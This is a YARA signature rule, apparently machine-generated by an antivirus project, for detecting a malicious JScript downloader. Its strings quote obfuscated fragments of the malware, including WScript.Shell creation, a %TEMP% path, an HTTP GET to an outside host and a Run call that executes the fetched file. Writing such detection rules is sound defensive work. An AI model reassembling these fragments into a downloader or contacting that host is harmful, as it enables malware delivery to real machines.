rule sig_20160427_ffb35c6ec325516ca75d038f7a8b788e {
  meta:
    description = "datamaliciousorder - file 20160427_ffb35c6ec325516ca75d038f7a8b788e.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "8ecb9297a5272cf8403d23dcc4b76e703112a4b954fbaf53f450417effa3e2a8"

  strings:
    $s1  = "function IeghoUvhxd() {return BydehKagxr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"VNZVKzj" ascii
    $s2  = "function IeghoUvhxd() {return BydehKagxr[\"E\"+\"xpandEnvir\"+\"cock\".charAt(1)+\"nmentStrings\"](\"%TE\"+\"MP%/\") + \"VNZVKzj" ascii
    $s3  = "function OmbcwAvtfx(AizsvXplkb, BlggrLamcj){FxnatKlphd = FxnatKlphd * 1; return AizsvXplkb - BlggrLamcj;};" fullword ascii
    $s4  = "var BydehKagxr = function RhvqjCuhcd() {return CzqfbLkbmp[NrcuiRwuom](\"WScript\"+\".Shell\");}(), SqepdQvgpe = 11;" fullword ascii
    $s5  = "var CzqfbLkbmp = this[\"WScript\"];" fullword ascii
    $s6  = "function NlkrrTcuwv(){return OrnxsNlrjh + \"\";};" fullword ascii
    $s7  = "if (YgikkInwuy[\"r\"+\"eadystate\"] < 2 * 2) continue;" fullword ascii
    $s8  = "YgikkInwuy[EvulcAyuly](\"G\" + \"ET\", \"http://lbbc.pt/n8wisd\", false);" fullword ascii
    $s9  = "function XubqsWmglp(){return NrcuiRwuom;};" fullword ascii
    $s10 = "function NqlmxQueqh(BcrmfZbqbt){BydehKagxr[\"R\"+\"un\"](BcrmfZbqbt, FxnatKlphd, FxnatKlphd);};" fullword ascii
    $s11 = "return OmbcwAvtfx(HmxkhKdlnc, PbctqQdbkw);" fullword ascii
    $s12 = "var OerfbVdlpb = new this[\"D\"+\"ate\"]();" fullword ascii
    $s13 = "function XxtcrQvfiu()" fullword ascii
    $s14 = "}while (XktrqKuioc);" fullword ascii
    $s15 = "function IqtcjCvgfo(){return 23;};" fullword ascii
    $s16 = "function IfpyhSlxxu(HvuswSqsuo) {var TzfhrUhwlv = (1, 2, 3, 4, 5, HvuswSqsuo); return TzfhrUhwlv;};" fullword ascii
    $s17 = "var LsdaaIiyaz = false;" fullword ascii
    $s18 = "LsdaaIiyaz = true;" fullword ascii
    $s19 = "SmiqtFfkzq = true; " fullword ascii
    $s20 = "var SmiqtFfkzq = false;" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}